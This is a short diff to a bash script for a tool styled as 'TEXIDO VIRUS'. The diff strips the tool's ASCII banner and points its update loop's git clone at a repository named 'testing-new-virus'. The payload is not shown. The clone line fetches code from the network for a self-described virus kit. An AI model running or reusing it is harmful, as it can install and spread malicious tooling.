@@ -26,26 +26,7 @@ echo " "
 }
 baner1(){
 clear
-echo -e '\e[93m               
-                         __________
-                      .~#########%%;~.
-                     /############%%;`\
-                    /######/~\/~\%%;,;,\
-                   |#######\    /;;;;.,.|
-                   |#########\/%;;;;;.,.|
-          XX       |##/~~\####%;;;/~~\;,|       XX
-        XX..X      |#|  o  \##%;/  o  |.|      X..XX
-      XX.....X     |##\____/##%;\____/.,|     X.....XX
- XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
-X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
-X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
-echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
- X# \.X        @#%,.@   TEXIDO VIRUS v2.2      @#%,.@        
-                @#%,.@              @#%,.@          
-                  @#%,.@          @#%,.@            
-                     @#%,.@      @#%,.@             
-                       @#%.,@  @#%,.@              
-                        TEXIDOMEG.ML
+echo -e '\e[93m 
 '
 echo " " 
 echo -e "$red                       ▶Coded by$grn JUSTINE$red◀$rset"
@@ -218,7 +199,7 @@ echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
 echo
 printf "                     \e[96m["
 # While process is running...
-while git clone https://github.com/noob-hackers/infect 2> /dev/null; do 
+while git clone https://github.com/Justine3237/testing-new-virus 2> /dev/null; do 
     printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
     sleep 1
 done
